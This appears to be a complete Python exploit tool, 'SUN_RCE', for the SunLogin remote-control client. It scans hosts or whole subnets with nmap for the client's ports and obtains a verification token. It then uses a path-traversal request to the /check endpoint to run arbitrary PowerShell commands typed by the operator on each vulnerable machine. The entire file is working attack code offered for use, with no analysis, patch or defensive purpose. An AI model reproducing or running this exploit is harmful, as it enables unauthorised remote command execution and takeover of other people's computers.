import requests
import json
import argparse
import IPy
import sys
from subprocess import PIPE, Popen
from multiprocessing.pool import ThreadPool
import re as reg
import time

filename = time.strftime("%Y-%m-%d %H-%M-%S", time.localtime()) + "sun_login.txt"


def logo():
    print('''


    ███████ ██    ██ ███    ██ ██████   ██████ ███████ 
    ██      ██    ██ ████   ██ ██   ██ ██      ██      
    ███████ ██    ██ ██ ██  ██ ██████  ██      █████   
         ██ ██    ██ ██  ██ ██ ██   ██ ██      ██      
    ███████  ██████  ██   ████ ██   ██  ██████ ███████ 
                                    v2.0
                                    Author ：king xiao 
        ''')


def curl(host_withport):
    url = "http://%s" % host_withport
    try:
        result = requests.get(url, timeout=5)
        if result.text == "{\"success\":false,\"msg\":\"Verification failure\"}":
            return host_withport
    except:
        pass


def exp(target):
    global vul_list
    # 获取token
    cmd = input("输入执行命令：")
    session = requests.session()
    burp0_url = "http://%s/cgi-bin/rpc?action=verify-haras" % target
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate",
                     "Connection": "close",
                     "Upgrade-Insecure-Requests": "1"}
    # session.get(burp0_url, headers=burp0_headers)
    try:
        res = json.loads(session.get(burp0_url, headers=burp0_headers).text)
        # print(res)
        token = res.get("verify_string")
        #print("[+] Get  token:{}".format(token))
        # 请求check，将CID放入cookie中
        # session = requests.session()
        burp0_url = "http://%s/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+%s" % (
            target, cmd)
        burp0_cookies = {"CID": "%s" % token}
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                         "Accept-Encoding": "gzip, deflate",
                         "Connection": "close",
                         "Upgrade-Insecure-Requests": "1"}
        res2 = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        print(res2.text)

    except:
        pass


def scan_port(target):
    process = Popen("nmap -p 49664-49675 --min-rate=10000 -T4 %s" % target, shell=True, stdout=PIPE, stderr=None)
    scan_result = process.communicate()[0]
    port = reg.findall("([\d]+/tcp)", scan_result)
    for i in range(len(port)):
        port[i] = port[i].strip("/tcp")
    #print("[*] Get ports：%s" % port)
    if not port:
        return
    #print("[*] Enumerating port of sunlogin")
    host_withport = [str(target) + ":" + x for x in port]
    # print(host_withport)
    # time1 = time.time()
    tp = ThreadPool(50)
    result = tp.map(curl, host_withport)
    # time2 = time.time()
    if result == []:
        print("[-] Could not find sun_login port or target not vulnerable")
        return
    else:
        print("[*] Target may vulnerability, try to exp it out.")
        for i in result:
            if i == None:
                continue
            else:
                exp(i)


if __name__ == "__main__":
    logo()
    parser = argparse.ArgumentParser(add_help=True, description="SUN_RCE")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-t', '--target', action='store',
                       help="specify target with sunlogin client installed,suport " "192.168.1.1 or 192.168.1.1/24")
    group.add_argument('-f', '--file', action='store', help="Specify the destination IP file")
    options = parser.parse_args()
    if options.target is None and options.file is None:
        parser.print_help()
        sys.exit(1)  # 有错误退出
    else:
        if options.target is None:
            with open(file=options.file, mode="r") as f:
                hosts = f.readlines()
            for ip in hosts:
                scan_port(ip.strip("\n"))
        else:
            if "/" in options.target:
                try:
                    hosts = IPy.IP(options.target)
                    for host in hosts:
                        scan_port(host)
                except Exception as e:
                    print(e)  # 打印错误明细
            else:
                scan_port(options.target)
